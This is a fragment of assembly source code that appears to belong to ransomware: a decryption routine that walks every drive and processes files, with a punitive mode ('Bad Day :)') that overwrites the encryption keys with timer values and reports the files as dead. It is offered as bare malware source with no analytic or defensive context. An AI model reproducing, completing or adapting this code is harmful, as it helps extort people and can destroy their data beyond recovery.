InitCoorectPwdDecryptProc proc
      .if     UsingEngOrRuInFace == 1
              invoke MessageBox, 0, addr szPrepDecryptFiles, addr szDisplayName, MB_ICONINFORMATION
      .else
              invoke MessageBox, 0, addr szPrepDecryptFiles2, addr szDisplayName2, MB_ICONINFORMATION
      .endif
      ; Safe Decrypt when eax == 0
      xor     eax, eax
      call    DecryptProc
      ret
InitCoorectPwdDecryptProc endp

DecryptProc   proc uses ebx
      LOCAL   KILLEM :DWORD
      mov     dword ptr [KILLEM], eax
      .if     ( eax == -1 )
              ; Bad Day :)
              mov     edi, offset KEY
              db 0Fh,31h
              stosd
              stosd
              stosd
              stosd
              mov     edi, offset TEA_KEY_origin ; (!)
              stosd
              stosd
              stosd
              stosd
      .endif
      
      invoke  lstrcpy, addr TempBuf2, addr zv
      invoke  lstrcat, addr TempBuf2, addr fake1
      invoke  lstrcat, addr TempBuf2, hExt
      
      mov     eax, dword ptr [KILLEM]
      .if     ( eax == -1 )
              mov     byte ptr [WORKING_STATUS], 2
      .else
              mov     byte ptr [WORKING_STATUS], 1
      .endif
      invoke  SetErrorMode, SEM_FAILCRITICALERRORS
      invoke  GetLogicalDrives
      mov     ecx, 25
decrypt_find_drives:
      mov     ebx, 1                                     
      shl     ebx, cl                                 
      and     ebx, eax                                    
      je      decrypt_no_disk                                       
      add     cl,65                                      
      mov     byte ptr buf, cl                             
      sub     cl,65                                     
      mov     dword ptr buf+1, '.*\:'                      
      mov     byte ptr buf+5, '*'                           
      mov     byte ptr buf+6, 0                            
      push    eax                                          
      push    ecx                                            
      call    CryptFiles                                     
      pop     ecx                                           
      pop     eax                                           
decrypt_no_disk:                                                    
      dec     ecx                                           
      jge     decrypt_find_drives 
      
      mov     eax, dword ptr [KILLEM]
      .if     eax == 0
              .if     UsingEngOrRuInFace == 1
                      invoke MessageBox, 0, addr szSuccess, addr szDisplayName, MB_ICONINFORMATION
              .else
                      invoke MessageBox, 0, addr szSuccess, addr szDisplayName2, MB_ICONINFORMATION
              .endif
      .elseif eax == -1
              .if     UsingEngOrRuInFace == 1
                      invoke MessageBox, 0, addr szDeadFiles, addr szDisplayName, MB_ICONINFORMATION
              .else
                      invoke MessageBox, 0, addr szDeadFiles2, addr szDisplayName2, MB_ICONINFORMATION
              .endif
      .endif
            
      ret
DecryptProc   endp
